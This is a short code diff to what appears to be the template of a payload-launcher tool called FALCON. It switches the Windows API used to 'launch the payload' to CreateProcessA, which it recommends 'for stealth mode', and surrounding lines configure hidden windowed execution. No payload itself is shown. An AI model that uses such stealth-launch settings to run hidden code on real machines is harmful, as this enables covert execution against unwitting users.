@@ -16,8 +16,8 @@
 #!setVar##FAL_cmd##cmd.exe /C python##str
 #!reqVar##GUI##When set to True, the program runs as a background windowed application. When False, it runs in a console window with visible output.##str
 #!setVar##GUI##True##str
-#!reqVar##FAL_exe##Specifies the API function used to launch the payload. Accepts WinExec or OpenProcessA. For stealth mode, OpenProcessA is recommended.##str
-#!setVar##FAL_exe##OpenProcessA##str
+#!reqVar##FAL_exe##Specifies the API function used to launch the payload. Accepts WinExec or CreateProcessA. For stealth mode, CreateProcessA is recommended.##str
+#!setVar##FAL_exe##CreateProcessA##str
 
 {% if TO_TEMPLATE_GUI == False or TO_TEMPLATE_GUI == 'False' %}
     {% set FALCON_ENTRY = "Main" %}
@@ -27,7 +27,7 @@
     {% set FAL_hide = True %}
 {% endif %}
 
-{% if FAL_exe == "OpenProcessA" %}
+{% if FAL_exe == "CreateProcessA" %}
     {% set FALCON_EXECUTE = 'FALCON_StartLevel2'%}
 {% else %}
     {% set FALCON_EXECUTE = 'FALCON_StartLevel1'%}
